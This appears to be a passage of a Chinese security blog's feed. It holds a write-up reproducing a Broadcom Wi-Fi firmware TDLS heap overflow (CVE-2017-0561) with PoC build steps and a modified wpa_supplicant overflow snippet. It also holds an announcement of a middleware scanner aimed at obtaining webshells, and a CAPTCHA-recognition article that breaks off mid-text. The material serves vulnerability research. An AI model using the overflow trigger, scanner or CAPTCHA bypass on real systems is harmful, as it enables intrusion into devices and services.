      <category term="Poc" scheme="http://www.future-sec.com/tags/Poc/"/>
    
      <category term="BROADCOM WI-FI" scheme="http://www.future-sec.com/tags/BROADCOM-WI-FI/"/>
    
  </entry>
  
  <entry>
    <title>BROADCOM WI-FI芯片漏洞分析一</title>
    <link href="http://www.future-sec.com/broadcom-wifi-1.html"/>
    <id>http://www.future-sec.com/broadcom-wifi-1.html</id>
    <published>2017-08-29T16:00:00.000Z</published>
    <updated>2017-12-21T07:33:30.953Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Android Wi-Fi驱动一直是众多安全研究员关注的重点，Android Wi-Fi驱动中曾经被发现大量root提权漏洞。 但这些漏洞都是存在于WEXT(Wireless-Extensions)接口中的，WEXT是一种即将被淘汰的Wi-Fi配置接口。取而代之的是基于nl80211协议的cfg80211接口。本篇文章主要介绍了基于nl80211协议的cfg80211怎么触发Wi-Fi芯片中的漏洞。以及相关漏洞的定位和分析。</p>
<h2 id="为什么研究Wi-Fi？"><a href="#为什么研究Wi-Fi？" class="headerlink" title="为什么研究Wi-Fi？"></a>为什么研究Wi-Fi？</h2><p>Wi-Fi的使用已经与生活密不可分，Wi-Fi安全问题也应该受到更大的重视。在最近的一次移动安全峰会上，有一个议题是关于Wi-Fi芯片漏洞远程代码执行的。借此，重点研究了一下Wi-Fi芯片漏洞。</p>
<h2 id="读懂Poc需要哪些前提知识"><a href="#读懂Poc需要哪些前提知识" class="headerlink" title="读懂Poc需要哪些前提知识"></a>读懂Poc需要哪些前提知识</h2><h3 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h3><pre><code>poc 是jni语言编写的，那什么是jni呢?
</code></pre><p>JNI全称为java native interface,Java本地开发接口,JNI是一个协议,这个协议可以用来沟通Java代码和本地的c/c++代码 让两者可以相互的调用<br>在poc的文件结构中我们可以看到一个jni文件都包含下面三个文件：<br>•    Android.mk文件是在使用NDK编译C代码时必须的文件。Android.mk文件中描述了哪些C文件将被编译且指明了如何编译。<br>•    Application.mk目的是描述在你的应用程序中所需要的模块(即静态库或动态库)。<br>•    Pwn.c是触发漏洞的测试代码。</p>
<h3 id="Netlink-Protocol-Library-Suite-（libnl）"><a href="#Netlink-Protocol-Library-Suite-（libnl）" class="headerlink" title="Netlink Protocol Library Suite （libnl）"></a>Netlink Protocol Library Suite （libnl）</h3><p>主要用来套接字的处理、发送和接收数据、消息的构造和解析。</p>
<h3 id="Netlink"><a href="#Netlink" class="headerlink" title="Netlink"></a>Netlink</h3><p>Netlink协议是基于套接字的进程间通信（IPC）机制，它可用于用户空间进程和内核之间或者用户空间进程之间的通信。Netlink 协议基于 BSD 套接字并使用 AF_NETLINK 地址簇。每一个 Netlink协议都有自己的协议号（比如：NETLINK_ROUTE，NETLINK_NETFILTER，等等）。<br>它的寻址方案是基于 32 位的端口号（之前被称为 PID），这个端口号用来唯一的标识每一个对等通信节点。<br>-nl_send_auto_complete()消息和数据的发送函数<br>poc中主要使用nl_send_auto_complete函数来发送数据，这个是libnl封装好的。最终还是调用nl_send_auto() 函数来发送数据。参考一个翻译的官方文档：<a href="http://blog.guorongfei.com/2015/01/27/libnl-translation-part4/" rel="external nofollow noopener noreferrer" target="_blank">http://blog.guorongfei.com/2015/01/27/libnl-translation-part4/</a><br>-nla_put()数据封装函数<br>nla_put() 函数以 nla_reserve()函数为基础，只不过它还接收一个指向包含属性载荷的缓冲区的指针。这个函数会自动把数据从缓冲区拷贝到消息中去。会利用嵌套属性进行数据包封装，属性的嵌套是通过在代码前后分别调用nla_nest_start() 和 nla_nest_end() 来完成的。<br>nla_nest_start() 函数会在消息中添加一个没有实际载荷的属性头部，在此之后添加的数据都会成为容器属性的载荷部分直到调用 nla_nest_end()为止，它的调用“关闭”了容器属性并校正它的载荷长度以包含所有的数据长度。</p>
<h3 id="cfg80211-nl80211"><a href="#cfg80211-nl80211" class="headerlink" title="cfg80211/nl80211"></a>cfg80211/nl80211</h3><p>nl80211是供用户空间进程使用，操作利用cfg80211 API 开发无线网卡驱动。cfg80211是开发驱动的接口。</p>
<h3 id="TDLS-协议"><a href="#TDLS-协议" class="headerlink" title="TDLS 协议"></a>TDLS 协议</h3><p>TDLS旨在提供一种不依赖AP的Wi-Fi网络上的对等通信方式。 TDLS是基于IEEE 802.11z标准。TDLS自动链接配置主要通过几个过程来完成<br>•    TDLS Discovery过程<br>TDLS Discovery过程不是必要选项。一个TDLS STA设备可以选择直接发起TDLS建立过程。 TDLS Discovery 过程由一部STA设备通过AP或Go(群组拥有者) 向另外一部STA设备发送一个TDLS Discovery请求帧开始。如果目标设备也兼容TDLS，它将直接向该发送设备回复TDLS Discovery 响应帧，并提供有关设备本身的能力信息。包括所有支持速率及信道。TDLS Discovery 过程除了提供目标STA确实支援TDLS的相关能力信息外，TDLS Discovery过程的帧交互亦可以用作AP与目标TDLS STA设备的相对信号强度的测量。发起的STA能够判断与目标STA间的直接连接是否有利于提供有效信息。通过对比分別由目标STA设备与AP设备收到的信号强度，发起的STA设备可以评估建立直接连接是否会比通过AP发送数据包更为有效。<br>•    TDLS Setup过程<br>TDLS Setup过程需要进行一系列的帧交换。发起设备首先发送一个TDLS传输请求，通过AP信道传输至目标设备。封装帧包括发送设备的性能信息。目标设备之后会回复TDLS Setup 建立响应，同样通过AP信道传送其性能信息，另外附加一个状态代码，表示接受或者拒绝该建立请求。如果接受Setup请求，发送设备将会通过AP传送一个TDLS 确认帧（Confirm Frame）。至此，两部设备之间开始进行直接通讯。<br>•    TDLS Teardown过程<br>发送方或接受方设备均可向另外一方直接发送TDLS拆解帧（Teardown Frame），而如果未处于讯号范围內，该帧则可以通过AP信道传输。</p>
<h2 id="POC-的分析过程"><a href="#POC-的分析过程" class="headerlink" title="POC 的分析过程"></a>POC 的分析过程</h2><h3 id="NDK环境搭建"><a href="#NDK环境搭建" class="headerlink" title="NDK环境搭建"></a>NDK环境搭建</h3><p>网上有很多参考，这里就不再赘述。</p>
<h3 id="编译POC"><a href="#编译POC" class="headerlink" title="编译POC"></a>编译POC</h3><p>在这次研究过程中，POC的编译过程花费了大量时间。主要是不了解libnl库的正确使用方法，然后找了很多资料都是安卓开发ndk的，没有怎么使用libnl库的。最后经过大量资料参考，终于找到了一种暂时可行的方法，在那篇博文中作者称目前android自身没有携带libnl库，所以如果用到libnl库就需要把libnl一起移植到安卓上。我们就根据他所描述的方法，从github上down下来了一份已经移植好的安卓平台的libnl库。<br>具体命令如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/dschuermann/libnl-3-android</span></div><div class="line">cd libnl<span class="number">-3</span>-android/lib</div><div class="line">cd ../android_toolchain</div><div class="line">gvim jni/Android.mk(前文有该文件的相关介绍)</div><div class="line">gvim jni/Applcation.mk (前文有该文件的相关介绍)</div></pre></td></tr></table></figure></p>
<p>在Android.mk的最后部分加上这一段：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">include</span> $(CLEAR_VARS)  LOCAL_MODULE := pwn  LOCAL_SRC_FILES :=  $(call <span class="keyword">list</span>-all,$(LOCAL_PATH),pwn.c)  LOCAL_SHARED_LIBRARIES := nl<span class="number">-3</span> nl-genl<span class="number">-3</span>  <span class="keyword">include</span> $(BUILD_EXECUTABLE)</div></pre></td></tr></table></figure></p>
<p>修改好之后将pwn.c文件拷贝到lib文件就可以编译了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd ../../android_toolchain</div><div class="line">ndk-build</div></pre></td></tr></table></figure></p>
<p>编译好后将libs文件夹下的libnl-3.so，libnl-genl-3.so，pwn 利用adb命令将libs文件下的lib-3.so、lib-genl-3.so、pwn拷贝到已经root后的支持nl80211协议的测试机中，执行编译好的pwn就可以测试poc是否可用了。</p>
<h3 id="测试POC"><a href="#测试POC" class="headerlink" title="测试POC"></a>测试POC</h3><p>分别在华为、小米、nexus 6p手机上进行了poc的测试。poc具体执行情况在小米手机上执行所有poc都是no such file or directory 。在华为手机上发送数据后的返回值为success。nexus手机测试结果也是success。 因为没有过wifi漏洞分析经验，不知道触发漏洞后正确的返回值应该是什么？所以接下来要透彻了解漏洞是否触发还需要大量的固件分析，漏洞定位，利用漏洞复现工作。</p>
<h2 id="Wifi芯片代码分析"><a href="#Wifi芯片代码分析" class="headerlink" title="Wifi芯片代码分析"></a>Wifi芯片代码分析</h2><p>经过一系列的各种折腾，终于开始慢慢切入正题。分析的芯片是nexus 6p 6.0 版本。</p>
<h3 id="怎么找到Wi-Fi固件？"><a href="#怎么找到Wi-Fi固件？" class="headerlink" title="怎么找到Wi-Fi固件？"></a>怎么找到Wi-Fi固件？</h3><p>要分析漏洞的成因，需要找到Wi-Fi芯片中与应用层通信部分代码。那接下来要怎么做才能将手机中的固件代码导出来呢？<br>第一步：我们需要了解Wi-Fi芯片在安卓系统内存中的加载位置。关于这个问题我们参考了Project Zero 的博客中分析的有关Wi-Fi芯片架构的知识，在Broadcom Wi-Fi芯片组相关的数据手册中，ARM内核具有用于保存固件代码的640KB ROM，以及用于数据处理（例如堆）和存储固件代码补丁的768KB RAM。</p>
<p>RAM的位置可以通过读取主机驱动程序中的初始化代码，找到包含RAM内容的文件是上图所示fw_bcmdhd.bin文件（实际上，通过驱动程序的代码，我们找到了BCMDHD_FW_PATH配置，其用于表示驱动程序将内容上传到RAM的文件的位置。）</p>
<p>ROM转存则可以通过Broadcom提供的一个非常强大的命令行实用程序dhdutil，可用于通过bcmdhd驱动程序与芯片进行交互。命令： ./dhdutil -i wlan0 membytes r 0x0 0xA0000 &gt; /sdcard/rom.bin</p>
<h3 id="什么时候产生漏洞？"><a href="#什么时候产生漏洞？" class="headerlink" title="什么时候产生漏洞？"></a>什么时候产生漏洞？</h3><p>  利用上述方法转存出来bin文件之后，我们首先要了解bug产生的原因，才能下一步更好的定位漏洞位置。根据Project Zero提供的技巧，Wi-Fi管理帧以小的“标记”数据块（称为信息元素（IE））对大多数信息进行编码，传输的大部分信息也是利用IE进行编码的，所以这应该是我们逆向分析的一个好的出发点，有数据交互才可能出现漏洞。分析了漏洞利用可行性之后确定了在进行TDLS连接过程中会触发漏洞。有关TDLS前文中有描述。</p>
<h3 id="定位固件中漏洞位置"><a href="#定位固件中漏洞位置" class="headerlink" title="定位固件中漏洞位置"></a>定位固件中漏洞位置</h3><p>根据Project Zero的提示在brcmsmac驱动程序可以找到Broadcom是使用一个函数从bcm_parse_tlvs帧提取IE。那接下来我们需要做的就是定位这个函数。搜索附近字符串提示我们首先定位到了bcm_parse_tlvs函数位置。<br><img src="/images/wifi1.png" alt="img"><br>然后通过交叉参考分析最终找到漏洞函数，要探索该漏洞的成因，首先要知道TDLS建立确认帧的函数处理流程。这个函数首先会执行一些验证，以确保请求是合法的。其查询内部数据结构，以确保确实正在与请求对等体建立TDLS连接。然后，其验证Link-ID IE（通过检查其编码的BSSID与当前网络的匹配），并且还验证32字节的发起者随机数（“Snonce”）值（通过将其与存储的初始随机数进行比较）。 建立对请求可能确实是合法的一定程度的置信度后，该函数开始调用一个内部帮助函数，任务是计算MIC并确保其与编码在帧中的一致。固件还包括该函数的名称(“wlc_tdls_cal_mic_chk”)。我们先看MIC通过编码在握手帧中的计算。<br><img src="/images/wifi2.png" alt="img"></p>
<p>我们对固件逆向后也定位到了这个函数，如下图所示，反编译后伪代码中提示信息可以看到在标记的第二段代码进行了IE长度的校验，后续的IE就没有校验了。因此，将RSN-IE的长度设置为较大的值将导致Timeout Interval和Fast Transition IE越界复制，从而溢出缓冲区。<br><img src="/images/wifi3.png" alt="img"></p>
<p>接下来看断开连接时mic计算。<br><img src="/images/wifi4.png" alt="img"></p>
<p>伪代码中的在断开帧时没有对FT-IE进行溢出校验，如果构造好FT-IE数据就能触发溢出。<br><img src="/images/wifi5.png" alt="img"></p>
<h2 id="漏洞触发场景复现"><a href="#漏洞触发场景复现" class="headerlink" title="漏洞触发场景复现"></a>漏洞触发场景复现</h2><p>知道了漏洞是怎么产生的，接下来就是测试漏洞是否按照我们预期的那样能够触发。<br>首先，准备了同时支持TDLS 协议的TL-WN722N无线网卡，跟nexus 6p。<br>第二步，为了测试漏洞，需要修改wpa_supplicant，以使我们能发送包含过大FTIE的TDLS断开帧。查看wpa_supplicant的代码可快速识别负责生成和发送断开帧的函数wpa_tdls_send_teardown。通过对该函数添加一些小的更改（绿色），我们应该能够在收到断开帧时触发溢出，导致超写25个字节的0xAB，修改后make编译一下。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> int wpa_tdls_send_teardown(struct wpa_sm *sm, <span class="keyword">const</span> u8 *addr, u16 reason_code)</div><div class="line">&#123;</div><div class="line">...</div><div class="line">ftie = (struct wpa_tdls_ftie *) pos;</div><div class="line">ftie-&gt;ie_type = WLAN_EID_FAST_BSS_TRANSITION;</div><div class="line">ftie-&gt;ie_len = <span class="number">255</span>;</div><div class="line">os_memset(pos + <span class="number">2</span>, <span class="number">0x00</span>, ftie-&gt;ie_len);</div><div class="line">os_memset(pos + ftie-&gt;ie_len + <span class="number">2</span> - <span class="number">0x19</span>, <span class="number">0xAB</span>, <span class="number">0x19</span>); <span class="comment">//Overflowing with 0xAB</span></div><div class="line"></div><div class="line">os_memcpy(ftie-&gt;Anonce, peer-&gt;rnonce, WPA_NONCE_LEN);</div><div class="line">os_memcpy(ftie-&gt;Snonce, peer-&gt;inonce, WPA_NONCE_LEN);</div><div class="line">pos += ftie-&gt;ie_len + <span class="number">2</span>;</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>第三步，执行TDLS命令去触发。这种情况是可以触发漏洞的，但是呢并没有明显现象的原因是Broadcom堆实现背后的逻辑。深入分析分配算符的逻辑，我们发现其非常简单，其是一个简单的“最适合”分配算符，其执行向前和向后合并，并保持一个空闲块单链表。当分配块时，从最适合空闲块（足够大的最小块）的末端（最高地址）对其进行切取。在断开连接后，空闲列表中的其中一个块的大小突然异常大。回想一下，由于分配算符使用“最适合”，这意味着只要存在其他足够大的空闲块，后续分配将不会被放置在此块中。这也意味着固件不会崩溃，实际上会继续正常运行。如果我们不可视化堆的状态，我们就根本无法确定发生了什么事。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">TDLS_DISCOVER – 发送“TDLS发现请求”帧并列出响应</div><div class="line">TDLS_SETUP - 建立与具有给定MAC地址的对等体的TDLS连接</div><div class="line">TDLS_TEARDOWN - 断开与具有给定MAC地址的对等体的TDLS连接</div></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近两周的分析过程中，确实遇到了很多问题，比如最开始编译poc的过程中对libnl库不会用，花了很长时间，最终的可行方法也不知道是不是最适合的。poc代码中使用了内核通信netlink协议，之前并没有接触过，这次也只是花了两天时间粗略看了poc中用到的函数。有关netlink相关知识后续还要深入学习。接下来编译测试poc之后，poc测试返回success但是并没有明显的触发漏洞现象。<br>基于此，参考了Project Zero的博客复现了CVE-2017-0561漏洞，整个过程从Wi-Fi芯片固件的知识开始了解，到怎么定位漏洞位置，怎么找到漏洞，怎么利用漏洞触发漏洞。这个过程也学到了很多知识。比如，Wi-Fi帧格式、TDLS协议、Broadcom堆实现、支持TDLS协议的wpa_supplicant开源工具等这些的理解。接下来要想利用漏洞就需要深入的去理解Wi-Fi的通信过程，netlink协议，以及动态的分析过程。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、 <a href="http://bobao.360.cn/learning/detail/3742.html" rel="external nofollow noopener noreferrer" target="_blank">http://bobao.360.cn/learning/detail/3742.html</a><br>2、 <a href="https://googleprojectzero.blogspot.jp/2017/04/over-air-exploiting-broadcoms-wi-fi_4.html" rel="external nofollow noopener noreferrer" target="_blank">https://googleprojectzero.blogspot.jp/2017/04/over-air-exploiting-broadcoms-wi-fi_4.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Android Wi-Fi驱动一直是众多安全研究员关注的重点，Android Wi-Fi驱动中曾经被发现大量root提权漏洞。 但这些漏洞都
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Poc" scheme="http://www.future-sec.com/tags/Poc/"/>
    
      <category term="BROADCOM WI-FI" scheme="http://www.future-sec.com/tags/BROADCOM-WI-FI/"/>
    
  </entry>
  
  <entry>
    <title>中间件漏洞检测框架(F-MiddlewareScan)</title>
    <link href="http://www.future-sec.com/f-middlewarescan.html"/>
    <id>http://www.future-sec.com/f-middlewarescan.html</id>
    <published>2016-03-16T16:00:00.000Z</published>
    <updated>2017-11-20T07:46:13.395Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p>实现针对中间件的自动化检测，端口探测-&gt;中间件识别-&gt;漏洞检测-&gt;获取webshell<br>参数说明<br>-h 必须输入的参数，支持ip(192.168.1.1)，ip段（192.168.1），ip范围指定（192.168.1.1-192.168.1.254），最多限制一次可扫描65535个IP。<br>-p 指定要扫描端口列表，多个端口使用,隔开 例如：7001,8080,9999。未指定即使用内置默认端口进行扫描(80,4848,7001,7002,8000,8001,8080,8081,8888,9999,9043,9080)<br>-m 指定线程数量 默认100线程<br>-t 指定HTTP请求超时时间，默认为10秒，端口扫描超时为值的1/2。<br>例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">python F-MiddlewareScan.py -h <span class="number">10.111</span><span class="number">.1</span></div><div class="line">python F-MiddlewareScan.py -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span><span class="number">-192.168</span><span class="number">.2</span><span class="number">.111</span></div><div class="line">python F-MiddlewareScan.py -h <span class="number">10.111</span><span class="number">.1</span><span class="number">.22</span> -p <span class="number">80</span>,<span class="number">7001</span>,<span class="number">8080</span> -m <span class="number">200</span> -t <span class="number">6</span></div></pre></td></tr></table></figure>
<p>效果图：</p>
<p><img src="/images/640.jpg" alt="img"></p>
<p>漏洞检测脚本以插件形式存在，可以自定义添加修改漏洞插件，存放于plugins目录，插件标准非常简单，只需对传入的IP，端口，超时进行操作，成功返回“YES|要打印出来的信息”即可。<br>新增插件需要在 plugin_config.ini配置文件中新增关联（多个漏洞插件以逗号隔开）。<br>中间件识别在discern_config.ini文件中配置（支持文件内容和header识别）</p>
<p>目前内置了19个漏洞插件，希望大家可以一起编写更多的插件，目前还缺少weblogic自动部署和反序列化探测以及中间件的反序列化自动获取webshell的插件等等。</p>
<p>下载地址：<a href="http://down.future-sec.com/F-MiddlewareScan.rar" rel="external nofollow noopener noreferrer" target="_blank">http://down.future-sec.com/F-MiddlewareScan.rar</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Setup&quot;&gt;&lt;a href=&quot;#Setup&quot; class=&quot;headerlink&quot; title=&quot;Setup&quot;&gt;&lt;/a&gt;Setup&lt;/h2&gt;&lt;p&gt;实现针对中间件的自动化检测，端口探测-&amp;gt;中间件识别-&amp;gt;漏洞检测-&amp;gt;获取webshell&lt;br&gt;参数
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="python" scheme="http://www.future-sec.com/tags/python/"/>
    
      <category term="自动化检测" scheme="http://www.future-sec.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>简单验证码识别及工具编写思路</title>
    <link href="http://www.future-sec.com/verification_code.html"/>
    <id>http://www.future-sec.com/verification_code.html</id>
    <published>2016-03-06T16:00:00.000Z</published>
    <updated>2017-07-10T19:39:19.295Z</updated>
    
    <content type="html"><![CDATA[<p>注：此文章只适合简单验证码，最后也将编写的工具附上以及关键部分代码和使用说明文档。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>虽然验证码发展到如今有许多人类都难以识别的状态了，但人有部分老系统使用的验证码异常的简单。还有一些网站由于程序员本身的素质或者缺乏相关图像相关的知识，所以并没有自己写验证码的生成程序，而是直接在网上随便复制粘贴一个Demo级别的代码来用，以达到网站有验证码的目的，而忽略了验证码的强弱性，导致很多网站的验证码都是爆款弱验证码。<br>如：</p>
<p><img src="/images/69145828_1.png" alt="img"></p>
<p> 还有更糟糕的比如：</p>
<p><img src="/images/69145828_2.png" alt="img"></p>
<p>   直接就能复制的…这种是完全不知道验证码的意义或者为了应付而做的验证码</p>
<h2 id="处理方式"><a href="#处理方式" class="headerlink" title="处理方式"></a>处理方式</h2><p>好吧忽略上面的图继续说。</p>
<p>对于那些简单验证码他们的共同点是：</p>
<ol>
<li>标准字体</li>
<li>背景单简单甚至纯色没有背景</li>
<li>字体并没有粘贴在一起<br>而本文讨论的就是这类的验证码。对于那种连背景都没有的纯色、标准字体、没有黏贴的那种再简单不过了，直接就是100%的识别率。</li>
</ol>
<p><img src="/images/69145828_3.png" alt="img"></p>
<p>这种就不讨论了，下面来看看wooyun的验证码。<br> Wooyun的验证码有两种状态：</p>
<p><img src="/images/69145828_4.png" alt="img"></p>
<pre><code>一种是白色文字深色背景，一种是黑色文字浅色背景。如果只有一种，无论是那种设定一个阀值都能很好的二值化，但现在的情况却是有两种，所以我能想到的最简单的方式，那好，我就给出两个阀值，对于黑色文字我就用一个较小一点的阀值，对于白色文字我就用一个较大一点的阀值。但是这样还是会出现一个问题，白色文字二值化后背景黑色文字白色 ，而黑色文字二值化后背景白色文字黑色，就像下面一样：
</code></pre><p><img src="/images/69145828_5.png" alt="img"></p>
<p>　　可以看出上面我左边框选区域一切正常，而右边却出了问题，那是因为在我写程序的时候，我认为二值化后文字都是黑色背景是白色，所以我就把黑色区域当作文字来框选，就看到了如上的效果。所以说这是一个问题，不仅要二值化，二值化后还要到底白色是文字还是黑色是文字。<br>　　于是我又想到一种办法，通常情况下一张图上背景的面积都会大于文字所占用的面积，所以在二值化的同时我还做了一件事情，二值化的同时记录下黑点个数和白点个数，如果黑点的个数大于了白点的个数，那么我就把黑白反色一下，让黑色像素点变成最少，这样再把黑色像素当作文字处理。</p>
<p><img src="/images/69145828_6.png" alt="img"></p>
<p>　　这样做还有一个问题就是，我应该怎么知道什么时候应该使用那一个阀值来二值化，当然办法可以有很多，比如当图像上深色像素多余浅色像素的时候，使用较大阀值，否则相反，不过我并不是这样做的。</p>
<p><img src="/images/69145828_7.png" alt="img"></p>
<p>　 　在工具上我提供了一个框，让用户输入验证码的字符个数，这样的话我对体统的阀值挨个遍历，二值化后去识别区域，如果框出来的区域个数是有问题的，那么就换下一个阀值，如果所有阀值都遍历完了还是有问题 ，那么这验证码确实也是超出这个工具的范围了，因为这个工具的目的是通用，对于那些需要单独写代码来识别的不在他的能力范围内。<br>　　在这之前一些验证码可能还需要一些处理，比如很常见的一些验证码有边框的。</p>
<p><img src="/images/69145828_8.png" alt="img"></p>
<p>　　左边是没有裁剪的边框，一起被二值化成为了黑色，然后拆字就悲剧了，右边是裁剪掉了一个像素的把边框去掉了，然后就一切正常了，这种情况就不说了，都懂的。<br>　　还有一种比较复杂的情况，因为二值化并不是万能的，并不是说什么验证码一进行二值化后，文字和背景就出来了，下面这张图是我以前程序需要做的百度推广的验证码识别。</p>
<p><img src="/images/69145828_9.png" alt="img"></p>
<p>　　上面这张图不怎么能看到效果，因为都是好几年前的事情了，验证码连接访问已经是500了，这张图都是测试的时候的截图。</p>
<p><img src="/images/69145828_10.png" alt="img"></p>
<p>　　我描述一下情况吧，上面的验证码，首先有边框、文字、干扰线，即使能把边框裁剪掉，也找不到一个合适的阀值来把线条和文字分离，很简单因为他的线条的颜色比文字的颜色深，如果我的阀值太小，那么我的文字就没有了，只会剩下一些线条在那里。</p>
<p><img src="/images/69145828_11.png" alt="img"></p>
<p>　　这图为上面那张图片上验证码的NZ两个字符，在ps中放大的效果(尽管上面图像原来并非保存的png格式已经失真，但大概还是能看到点什么的) 我也去翻了翻以前的代码来看，当初我二值化的时候，并非直接二值化的，在二值化之前还单独对RGB进行了判断，代码截图如下：</p>
<p><img src="/images/69145828_12.png" alt="img"></p>
<p>　　百度推广的验证码是我做的第一个验证码识别程序，所以我一直记得很清楚，不是一个二值化就能搞定的，所以说在这个工具中我也加入了同样可以单独处理RGB的功能。<br>　　由于百度的这个验证码已经访问不了了，所以我找了一个同样有线条的验证码，但是这个验证码线条颜色比文字颜色浅，所以我就用默认的127作为阀值，假设二值化无法搞定。</p>
<p><img src="/images/69145828_13.png" alt="img"></p>
<p>　　用127阀值上面线条一起被黑化了，但是图片中文字颜色接近黑色，而线条颜色却要浅一点，所以判断的时候，可以认为RGB的平均值大于20的就视为背景，就可以这样干。</p>
<p><img src="/images/69145828_14.png" alt="img"><br>　　然后效果就成了这样：</p>
<p><img src="/images/69145828_15.png" alt="img"></p>
<p>　 　这样线条就被处理掉了，不过这个验证码直接设置阀值就能搞定，只是为了说明，所以采用127作为阀值。还有一点这个验证码和百度的那个他们线条，都是在文字的下方，如果是在文字上方，那么同样的超出了这个工具的范围 ，对于线条在上方的，我想过一些处理方式，假设线条为红色的时候，我在遍历的时候遇到一个红色像素点，我就把红色像素设置为和他相邻像素的非红色的颜色，但是我想了一想这个“相邻”，就涉及了它周围八个像素点，我应该取那一个像素点的颜色。<br>     如果是在背景上还好，他周围应该都是背景的颜色，那一个都无所谓，可是如果是在线条，背景还有文字的交界处就不好处理了，所以工具里面暂时还没提供这样的功能，还有那种很难分离背景或者字黏贴在一起的，但是每个文字都是一个颜色的那种，也想过一些处理方式，但是实现起来我感觉都会存在一些小问题，所以就还展示没有做，就不扯那么多了，等做好了再来扯，才比较有证据。</p>
<h2 id="拆字和识别"><a href="#拆字和识别" class="headerlink" title="拆字和识别"></a>拆字和识别</h2><pre><code>下面来说说验证码识别中的一个难点 -&gt; 拆字。
基本上在我看来，能正确的拆字，那么就已经成功了80%了，因为剩下的就是比对的问题了，我在工具中只提供了两种方式拆字。
</code></pre><p><img src="/images/69145828_16.png" alt="img"></p>
<pre><code>手动添加就不用说了，我这里的自动识别是最传统的深度遍历，从图像的第一个像素点开始遍历，因为图像已经二值化，按照我的工具的理解 ，就只剩下白色背景和黑色文字，所以遇到一个黑色像素点的时候开始记录，然后开始深度遍历，大概效果如下：
</code></pre><p><img src="/images/69145828_17.png" alt="img"><br>    　　大概代码如下：</p>
<p><img src="/images/69145828_18.png" alt="img"></p>
<pre><code>对于拆字还有很多其他的方式，这里只是最普通的也是最简单的一种，对于其他方式这个工具中并没有提供，因为工具只针对简单通用的验证码，对于那种需要单独写代码的验证码不考虑，而且工具上功能附加太多也就变得复杂了，其实重点就是感觉有点付出和回报不成正比，而且对于那些流传的拆字理论知识，说起来确实简单，但是实际做的时候才会发现，这些理论其实是存在漏洞的，只会在特定条件下才会成立，而验证码却是变幻多端的，这里也就不扯那么多了。
</code></pre><p>   剩下来的就是识别了，我采用的识别方式比较简单，就是两张图来对比，一张是验证码上面截取出来的图像，一张是已知的样本图像。</p>
<p><img src="/images/69145828_19.png" alt="img"></p>
<pre><code>调用函数会返回这两张图的重叠的像素的个数，这样我把截取出来的验证码字符和我所有的样本对比一次，取出nCount最高的一个作为结果，也就是说取出和样本中重叠率最高的一个出来作为结果，在工具中我有两种方式提供样本，一种是使用系统的字体，一种是手动采集。
</code></pre><p><img src="/images/69145828_20.png" alt="img"></p>
<pre><code>如果使用系统字体，在文本框内输入验证码可能出现的字符，然后点击生成，会弹出系统对话框设置字体，从而产生样本，不过对于一些非标准字体，系统字体就很难搞定了，无论是标准字体，还是非标准的字体都建议使用手动采集的方式，因为直接从验证码上截取下来的图怎么说也是原配，重复的图片工具也只会采集一次，不会重复添加降低效率比对，下面就是一个非标准字体。
</code></pre><p><img src="/images/69145828_20.png" alt="img"></p>
<p>   理论上来说，样本采集越多越全，识别率就越高，反正我每次都是使用的手动采集样本，对了这个工具只是一个配置工具而已，并不能用来做什么其他事情，当一切都配置好了之后，就可以点击工具上的 文件 -&gt; 保存，将这些所有的配置保存成一个文件，可以保存为两种后最(.ci和.ci.png) ，后者以图片保存方便电脑上查看。</p>
<p><img src="/images/69145828_21.png" alt="img"></p>
<pre><code>而识别是另一个独立的工具调用，如果是.NET，则直接调用提供的dll来识别，之所以这样设计是因为，我并不知道别人，会用验证码识别来做什么事情，所以除了识别以外，我也不知道别人想要什么功能，所以把所有东西全部独立出来，供别人调用或者使用，对于识别我提供了一个命令行调用工具供给非.NET平台的程序调用。
</code></pre><p><img src="/images/69145828_22.png" alt="img"></p>
<pre><code>以python举例：
